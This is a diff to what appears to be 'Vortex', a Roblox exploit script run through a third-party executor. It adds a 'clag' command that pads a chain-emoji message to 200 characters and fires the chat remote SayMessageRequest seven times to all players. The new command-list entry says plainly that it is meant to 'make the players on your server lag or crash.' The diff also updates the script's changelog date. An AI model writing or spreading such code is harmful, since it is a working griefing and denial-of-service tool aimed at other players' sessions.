@@ -7501,7 +7501,21 @@ ForceBodyPart()
 if isNumber(var) then
 PetHat_R15AndR6(tonumber(var))
 else
-ErrorPrompt("Required Number","only supports numbers 1-10")
+ErrorPrompt("Required Number","only supports ID accessories")
+end
+end
+if cmd == "clag" then
+local Message = "⛓" 
+local Unicode = " "
+Message = Message .. Unicode:rep(200 - #Message)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local SayMessageRequest = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
+
+if SayMessageRequest then
+    for i = 1, 7 do
+        SayMessageRequest:FireServer(Message, "All")
+    end
 end
 end
 -- limit
@@ -7720,6 +7734,7 @@ cmds[#cmds + 1] = {Text = "[203] " .. tostring(prefix) .. "headless",Title = "re
 cmds[#cmds + 1] = {Text = "[204] " .. tostring(prefix) .. "discordusername",Title = "copy my discord username"}
 cmds[#cmds + 1] = {Text = "[205] " .. tostring(prefix) .. "glitcher",Title = "Fe script work R6 and R15"}
 cmds[#cmds + 1] = {Text = "[206] " .. tostring(prefix) .. "pet [hat id]",Title = "turn your accessories into pets"}
+cmds[#cmds + 1] = {Text = "[207] " .. tostring(prefix) .. "clag",Title = "make the players on your server lag or crash."}
 
 for v = 1, #cmds do
 -- for _,v in next, #cmds do
@@ -7861,7 +7876,7 @@ introFrame.BackgroundColor3 = Color3.new(1, 1, 1)
 introFrame.Parent = introGui
 
 title.Name = "Text"
-title.Text = "Vortex UPDATE LIST: [08/06/2023] \n\n[CONTENT] \n[+] added 1 new command \nlook in the console for new commands by clicking F9 \n\n[BALANCE] \n[?] Fixed MarketplaceService bug \n\n[EVENT] \n[?] There isn't any.. \n\n[PROMOTION / SPONSORSHIP] \n[?] There isn't any.. \n\nNeed help? dm me in discord: Tora#4172 \n\nNOTE: The command list is in the console. \nExecutor currently in use: " .. Executor() -- .. LOCAL_WEB_IP_HOST()
+title.Text = "Vortex UPDATE LIST: [10/06/2023] \n\n[CONTENT] \n[+] added 1 new command \nlook in the console for new commands by clicking F9 \n\n[BALANCE] \n[?] Fixed MarketplaceService bug \n\n[EVENT] \n[?] There isn't any.. \n\n[PROMOTION / SPONSORSHIP] \n[?] There isn't any.. \n\nNeed help? dm me in discord: Tora#4172 \n\nNOTE: The command list is in the console. \nExecutor currently in use: " .. Executor() -- .. LOCAL_WEB_IP_HOST()
 title.Size = UDim2.new(1, 0, 1, 0)
 title.Position = UDim2.new(0, 0, 0, 0)
 title.BackgroundColor3 = Color3.new(0, 0, 0)
